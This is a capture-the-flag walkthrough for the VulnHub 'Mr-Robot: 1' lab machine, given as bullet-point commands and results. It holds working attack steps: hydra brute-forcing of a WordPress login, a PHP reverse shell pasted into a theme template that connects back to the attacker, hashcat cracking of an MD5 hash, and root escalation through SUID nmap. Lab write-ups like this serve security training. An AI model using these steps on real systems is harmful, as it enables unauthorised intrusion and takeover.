# Mr-Robot: 1

VM available here: https://www.vulnhub.com/entry/mr-robot-1,151/

---

* `ifconfig` - find IP address of the attack VM
* `sudo arp-scan AAA.AAA.AAA.0/24` - find all IPv4 devices on the network
* `nmap -p- -O -sV -vvv BBB.BBB.BBB.BBB` - scan the target machine
    * OS: Linux 3.10 - 4.11
    * 2 open ports: 80 (HTTP), 443 (HTTPS)
    * 1 closed port: 22 (SSH)
* Open victim's IP address in a browser
    * Shows a web terminal, similar to https://www.whoismrrobot.com
    * Commands seem to give promo material for the Mr Robot TV series - probably doesn't help with the VM
* `nikto -h BBB.BBB.BBB.BBB` - scan the web server
    * Version: PHP 5.5.29
    * Site uses WordPress
* `nmap -p- -O -sV -vvv BBB.BBB.BBB.BBB --script=http-enum` - scan the target machine, enumerating directories used by popular web apps and servers
    * `BBB.BBB.BBB.BBB/admin/index.html` - looks interesting, but doesn't finish loading
    * `BBB.BBB.BBB.BBB/robots.txt` - gives the location of the first flag, and a dictionary file
        * **FLAG:** `BBB.BBB.BBB.BBB/key-1-of-3.txt`
* `wpscan --url BBB.BBB.BBB.BBB -e u` - WordPress security scanner
    * This complains that the site doesn't seem to be running WordPress
    * Re-run the scan with the `--force` flag
        * WPScan can't find the wp-content dir
* Try to brute-force the WordPress credentials using the dictionary file
    * `curl BBB.BBB.BBB.BBB/fsociety.dic --output fsociety.dic`
    * `cat fsociety.dic | sort -u > fsociety.uniq.dic` - sort and include unique terms only
    * Try to find username:
        * `hydra -L fsocity.dic.uniq -p ? BBB.BBB.BBB.BBB http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -t 64`
        * This took a while
        * Found a username: `elliot`
    * Try to find password:
        * `hydra -l elliot -P fsocity.dic.uniq BBB.BBB.BBB.BBB http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 64`
        * Found password: `ER28-0652`
    * Navigate to `BBB.BBB.BBB.BBB/wp-admin` and log in with the credentials found
* Webshell
    * Elliot is the WP admin
    * In the WP Dashboard, go to Appearance -> Editor, and select the `404.php` template
    * Copy the content of `/usr/share/webshells/php-reverse-shell.php` and paste it as the content of the WP 404 page.
        * Update the IP address (`$ip` PHP variable) to `AAA.AAA.AAA.AAA`
    * Set up a local listener: `nc -lvp 1234`
    * Navigate to `BBB.BBB.BBB.BBB/404.php`
    * This opens a shell for `daemon`
    * Looking through filesystem:
        * **FLAG:** `/home/robot/key-2-of-3.txt`
        * The file can only be read by the `robot` user
        * `cat /home/robot/password.raw-md5`
        * `hashcat -a 0 -m 0 <raw-md5-hash> /usr/share/wordlists/rockyou.txt`
        * This decoded the password: `abcdefghijklmnopqrstuvwxyz`
* Log into the mrRobot VM as the `robot` user
    * `cat key-2-of-3.txt`
* Try to find the 3rd key from the mrRobot VM, but many directories give "Permission denied"
    * `find / -perm -u=s -type f 2>/dev/null` - find files that can be run as the user/group who created them
    * Found `/usr/local/bin/nmap`
        * This is Nmap version 3.81 - versions 2.02 to 5.21 have an interactive mode
        * `nmap --interactive`
        * `!sh` - start a shell with root permissions
        * `find / -name "*key-3*"` - try to find the last key
        * **FLAG:** `/root/key-3-of-3.txt`
